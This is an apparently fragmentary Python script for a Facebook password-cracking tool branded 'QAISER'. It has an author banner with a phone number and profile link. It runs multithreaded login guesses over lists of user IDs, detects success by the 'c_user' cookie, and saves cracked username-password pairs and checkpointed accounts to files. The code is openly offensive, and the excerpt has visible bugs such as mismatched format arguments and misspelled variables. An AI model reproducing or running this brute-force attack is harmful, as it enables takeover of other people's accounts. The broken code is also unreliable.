...
logo="""\033[1;37m
 ...
 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
    Author   : HAROON JANI
    Facebook : facebook.com/Imtiaz.QAISER
    Connect  : +93776811468
    Tolls    : QAISER
 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/HAROON-OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/HAROON-CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back QAISER Menu ")
	    R()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;35m[QAISER]\x1b[1;37m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [QAISER-SUCCESSFUL] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/QAISER_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [QAISER_CHECKPOINT] %s | %s ' % (M, uer, p))
                        wrt = '%s|%s' % (use,w)
                        cp.append(wrt)
                        open('/sdcard/QAISER_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                        ...
                        pass
                    print('\r%s [QAISER-CHECKPOINT] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (usr,w)
                    cp.append(wrt)
                    open('/sdcard/QAISER_CP.txt' , 'a').write('%s\n' % wrt)
                    break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;32m      THE POWER OF QAISER HATERS FEEL \033[1;37m")
            print(" [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡")
            ...
            os.system("clear")
            print(logo)
            print("\033[1;32m      THE POWER OF AKINH HATERS FEEL 😂\033[1;37m")
            print(" [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
